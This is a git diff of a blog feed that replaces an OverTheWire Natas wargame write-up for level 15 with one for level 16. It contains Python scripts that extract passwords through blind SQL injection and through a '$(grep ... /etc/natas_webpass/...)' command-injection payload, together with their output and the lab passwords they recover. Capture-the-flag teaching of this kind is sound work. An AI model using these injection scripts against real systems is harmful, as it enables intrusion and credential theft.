-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will produce a positive output when the password associated with &lt;strong&gt;natas16&lt;/strong&gt; contains a letter given by us (or in this case also an uppercase letter and numbers) and we will produce a string composed of all the letters present in the actual password. We should write a script in order to achieve this since doing that by hand is not possible.&lt;br&gt;
-&lt;strong&gt;Python script template:&lt;/strong&gt;&lt;/p&gt;
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code snippet submits the sent data from the &lt;strong&gt;natas16 index page&lt;/strong&gt; and searches the dictionary.txt file in order to find matching words that contain the given pattern. There is also some illegal character filter in place in order to make PHP injection more difficult to perform. The sollution to this level will be extremly similar to that of &lt;strong&gt;natas15&lt;/strong&gt; since we are gonna try data and use the response packets we get in order to filter out usefull data.&lt;/p&gt;
+&lt;h4 id=&#34;grep-documentation-needed&#34;&gt;Grep documentation needed:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep (1)             - print lines that match patterns
+    -E, --extended-regexp     PATTERNS are extended regular expressions
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are gonna do an extended regex in order to fill out characters in the password for &lt;strong&gt;natas17&lt;/strong&gt; in conjunction with a word that we know is present in the &lt;strong&gt;dictionary.txt&lt;/strong&gt; file, then if the response contains the word, we know that the selected character is in the password, otherwise not.&lt;/p&gt;
+&lt;h4 id=&#34;grep-format&#34;&gt;Grep format:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$(grep -E ^ string/character.* /etc/natas_webpass/natas17)Existing_key
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need to find a string that appears in &lt;strong&gt;dictionary.txt&lt;/strong&gt;:&lt;/p&gt;
+&lt;img src=&#34;//localhost:1313/img/natas/natas16-2.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+Now all that is left to do is implement this in a python script just like we did previously.
+&lt;h4 id=&#34;the-script&#34;&gt;The script:&lt;/h4&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
 
-target = &amp;#39;http://natas15.natas.labs.overthewire.org&amp;#39;
-possibleCharacterList = &amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;
-foundCharacterList = &amp;#39;&amp;#39;
+target = &amp;#39;http://natas16.natas.labs.overthewire.org&amp;#39;
+possible = &amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;
 
-for character in possibleCharacterList:
-	username = (&amp;#39;natas16&amp;#34; AND password LIKE BINARY &amp;#34;%&amp;#39; + character +&amp;#39;%&amp;#34; &amp;#34;&amp;#39;) #BINARY is used to make the search case sensitive
-	req = requests.get(target,
-		auth=(&amp;#39;natas15&amp;#39;,&amp;#39;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx&amp;#39;),
-		params={&amp;#34;username&amp;#34;: username}
-	)
-	if &amp;#34;This user exists&amp;#34; in req.text:
-		foundCharacterList += character
-		print (&amp;#39;Possible so far: &amp;#39; + foundCharacterList)
-print(&amp;#34;----&amp;#34;+&amp;#34;end of search&amp;#34;+&amp;#34;----&amp;#34;)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We use the &lt;strong&gt;request&lt;/strong&gt; library in order to make requests and get responses from the service then define our SQL query, define our auth parameters (&lt;strong&gt;the login data you have for natas15&lt;/strong&gt;) and if the response to our insert with a certain character is possitive, append it to the empty list.&lt;br&gt;
-&lt;strong&gt;Script execution:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;03:13:59 archie@Archie pyscript → python3 getpasswordletters.py
-Possible so far: 3
-Possible so far: 34
-Possible so far: 346
-Possible so far: 346c
-Possible so far: 346ce
-Possible so far: 346cef
-Possible so far: 346cefh
-Possible so far: 346cefhi
-Possible so far: 346cefhij
-Possible so far: 346cefhijk
-Possible so far: 346cefhijkm
-Possible so far: 346cefhijkmo
-Possible so far: 346cefhijkmos
-Possible so far: 346cefhijkmost
-Possible so far: 346cefhijkmostu
-Possible so far: 346cefhijkmostuv
-Possible so far: 346cefhijkmostuvD
-Possible so far: 346cefhijkmostuvDE
-Possible so far: 346cefhijkmostuvDEG
-Possible so far: 346cefhijkmostuvDEGK
-Possible so far: 346cefhijkmostuvDEGKL
-Possible so far: 346cefhijkmostuvDEGKLM
-Possible so far: 346cefhijkmostuvDEGKLMP
-Possible so far: 346cefhijkmostuvDEGKLMPQ
-Possible so far: 346cefhijkmostuvDEGKLMPQV
-Possible so far: 346cefhijkmostuvDEGKLMPQVW
-Possible so far: 346cefhijkmostuvDEGKLMPQVWX
-Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
-----end of search----
-Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, we confirmed that the password is composed out of these characters : &lt;strong&gt;346cefhijkmostuvDEGKLMPQVWXY&lt;/strong&gt;\&lt;/p&gt;
-&lt;h4 id=&#34;whats-next&#34;&gt;What`s next?&lt;/h4&gt;
-&lt;p&gt;Okay, so we have our string of present characters in the password but that is not the passkey for the next level. The approach will now be, for character in string, if password is like characterinstring% append to characterinstring and continue until the password reaches the length of 32 (&lt;strong&gt;all the password`s lenghts so far&lt;/strong&gt;) and then break.&lt;br&gt;
-For that I will make a function that takes the output of the last script and does what I`ve described ealier for each letter in the input.&lt;br&gt;
-&lt;strong&gt;Function:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def get_password(foundCharacterList):
-    password = &amp;#39;&amp;#39;
-    while len(password)!=32:
-        for character in foundCharacterList:
-            username = (&amp;#39;natas16&amp;#34; AND password LIKE BINARY &amp;#34;&amp;#39; + password + character + &amp;#39;%&amp;#34; &amp;#34;&amp;#39;)
-            req = requests.get(target,
-                auth=(&amp;#39;natas15&amp;#39;,&amp;#39;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx&amp;#39;),
-                params={&amp;#34;username&amp;#34;: username}
-            )
-            if &amp;#34;This user exists&amp;#34; in req.text:
-                password += character
-                print (&amp;#39;Password so far: &amp;#39; + password)
-                break
-    print(&amp;#34;Final password: &amp;#34; + password)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Now let`s run this:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;03:32:35 archie@Archie pyscript → python3 finalscript.py
-Possible so far: 3
-Possible so far: 34
-Possible so far: 346
-Possible so far: 346c
-Possible so far: 346ce
-Possible so far: 346cef
-Possible so far: 346cefh
-Possible so far: 346cefhi
-Possible so far: 346cefhij
-Possible so far: 346cefhijk
-Possible so far: 346cefhijkm
-Possible so far: 346cefhijkmo
-Possible so far: 346cefhijkmos
-Possible so far: 346cefhijkmost
-Possible so far: 346cefhijkmostu
-Possible so far: 346cefhijkmostuv
-Possible so far: 346cefhijkmostuvD
-Possible so far: 346cefhijkmostuvDE
-Possible so far: 346cefhijkmostuvDEG
-Possible so far: 346cefhijkmostuvDEGK
-Possible so far: 346cefhijkmostuvDEGKL
-Possible so far: 346cefhijkmostuvDEGKLM
-Possible so far: 346cefhijkmostuvDEGKLMP
-Possible so far: 346cefhijkmostuvDEGKLMPQ
-Possible so far: 346cefhijkmostuvDEGKLMPQV
-Possible so far: 346cefhijkmostuvDEGKLMPQVW
-Possible so far: 346cefhijkmostuvDEGKLMPQVWX
-Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
-----end of search----
-Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
-Password so far: h
-Password so far: hP
-Password so far: hPk
-Password so far: hPkj
-Password so far: hPkjK
-Password so far: hPkjKY
-Password so far: hPkjKYv
-Password so far: hPkjKYvi
-Password so far: hPkjKYviL
-Password so far: hPkjKYviLQ
-Password so far: hPkjKYviLQc
-Password so far: hPkjKYviLQct
-Password so far: hPkjKYviLQctE
-Password so far: hPkjKYviLQctEW
-Password so far: hPkjKYviLQctEW3
-Password so far: hPkjKYviLQctEW33
-Password so far: hPkjKYviLQctEW33Q
-Password so far: hPkjKYviLQctEW33Qm
-Password so far: hPkjKYviLQctEW33Qmu
-Password so far: hPkjKYviLQctEW33QmuX
-Password so far: hPkjKYviLQctEW33QmuXL
-Password so far: hPkjKYviLQctEW33QmuXL6
-Password so far: hPkjKYviLQctEW33QmuXL6e
-Password so far: hPkjKYviLQctEW33QmuXL6eD
-Password so far: hPkjKYviLQctEW33QmuXL6eDV
-Password so far: hPkjKYviLQctEW33QmuXL6eDVf
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfM
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
-Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
-Final password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, we`ve got the password for the next level : &lt;strong&gt;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo&lt;/strong&gt;&lt;/p&gt;
-</description>
+
+final = &amp;#39;&amp;#39;
+i = 0
+while len(final) != 32:
+	while i &amp;lt; len(possible):
+		character = possible[i]
+		needle = (&amp;#39;$(grep -E ^%s%c.* /etc/natas_webpass/natas17)abandoned&amp;#39; % (final, character))
+		req = requests.get(target,
+			auth=(&amp;#39;natas16&amp;#39;,&amp;#39;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo&amp;#39;),
+			params={&amp;#34;needle&amp;#34;: needle}
+		)
+		if &amp;#34;abandoned&amp;#34; not in req.text:
+			final += character
+			print (&amp;#39;Password so far : &amp;#39; + final)
+			i = 0
+		else:
+			i += 1
+print (&amp;#34;----Script Finished----&amp;#34;)
+print (&amp;#34;Password is : &amp;#34; + final)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now all that is left to do is run the script and obtain the password for &lt;strong&gt;natas17&lt;/strong&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;script-run&#34;&gt;Script run:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;02:59:31 archie@Archie python → python3 scriptnatas16.py
+Password so far : E
+Password so far : Eq
+Password so far : Eqj
+Password so far : EqjH
+Password so far : EqjHJ
+Password so far : EqjHJb
+Password so far : EqjHJbo
+Password so far : EqjHJbo7
+Password so far : EqjHJbo7L
+Password so far : EqjHJbo7LF
+Password so far : EqjHJbo7LFN
+Password so far : EqjHJbo7LFNb
+Password so far : EqjHJbo7LFNb8
+Password so far : EqjHJbo7LFNb8v
+Password so far : EqjHJbo7LFNb8vw
+Password so far : EqjHJbo7LFNb8vwh
+Password so far : EqjHJbo7LFNb8vwhH
+Password so far : EqjHJbo7LFNb8vwhHb
+Password so far : EqjHJbo7LFNb8vwhHb9
+Password so far : EqjHJbo7LFNb8vwhHb9s
+Password so far : EqjHJbo7LFNb8vwhHb9s7
+Password so far : EqjHJbo7LFNb8vwhHb9s75
+Password so far : EqjHJbo7LFNb8vwhHb9s75h
+Password so far : EqjHJbo7LFNb8vwhHb9s75ho
+Password so far : EqjHJbo7LFNb8vwhHb9s75hok
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5T
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
+Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+----Script Finished----
+Password is : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -406,7 +476,7 @@ Possible so far: 346cefhijkmostuvDEGKLMPQVWX
 Possible so far: 346cefhijkmostuvDEGKLMPQVWXY
 ----end of search----
 Possible characters: 346cefhijkmostuvDEGKLMPQVWXY
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, we confirmed that the password is composed out of these characters : &lt;strong&gt;346cefhijkmostuvDEGKLMPQVWXY&lt;/strong&gt;\&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, we confirmed that the password is composed out of these characters : &lt;strong&gt;346cefhijkmostuvDEGKLMPQVWXY&lt;/strong&gt;&lt;/p&gt;
 &lt;h4 id=&#34;whats-next&#34;&gt;What`s next?&lt;/h4&gt;
 &lt;p&gt;Okay, so we have our string of present characters in the password but that is not the passkey for the next level. The approach will now be, for character in string, if password is like characterinstring% append to characterinstring and continue until the password reaches the length of 32 (&lt;strong&gt;all the password`s lenghts so far&lt;/strong&gt;) and then break.&lt;br&gt;
 For that I will make a function that takes the output of the last script and does what I`ve described ealier for each letter in the input.&lt;br&gt;
